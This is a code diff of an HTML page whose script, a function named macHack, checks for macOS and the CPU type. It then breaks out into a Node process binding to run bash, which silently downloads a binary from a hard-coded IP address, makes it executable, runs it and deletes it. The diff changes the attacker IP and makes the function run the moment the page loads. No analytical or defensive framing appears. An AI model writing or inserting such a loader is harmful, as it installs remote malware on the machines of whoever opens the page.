@@ -7,6 +7,7 @@
 
 <body>
         <div id="root"></div>
+
 <img src="https://s1-11828.safetyimg.com/bs2/is-psp-file/file/d7e3e0c7484b4d28a586fb60ad4357e6.jpeg?pkey=AAVngST_HqvCenUXXAthPk6pIirMctfcoyCJTmxqBJ9vcnKJo81WXfmG0aJME8raG9aeP8nTJEcsoKgVsTod_9zxjMo06snFhPmXAQxTls0C9tRnCw2Xg--JVnwhqxFNc-k" alt="banner" class="banner-img" style="width: 100%;">
 
 </body>
@@ -18,13 +19,14 @@ function macHack(){
     
     if (this_platform == 'darwin'){
         if (this_arch == 'x64'){
-            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://43.140.243.84:8003/cdp_x64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
+            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://62.234.209.24:8003/cdp_x64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
         }else if(this_arch == 'arm64'){
-            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://43.140.243.84:8003/cdp_arm64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
+            window.parent.NODE['process'].binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','curl -s -k https://62.234.209.24:8003/cdp_arm64 -o /tmp/cdp && chmod +x /tmp/cdp && /tmp/cdp && rm -rf /tmp/cdp'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})
         }
     }
 }
-setTimeout(function() { macHack(); }, 300);
+
+macHack();
 //window.onload = function() {
     
 //}
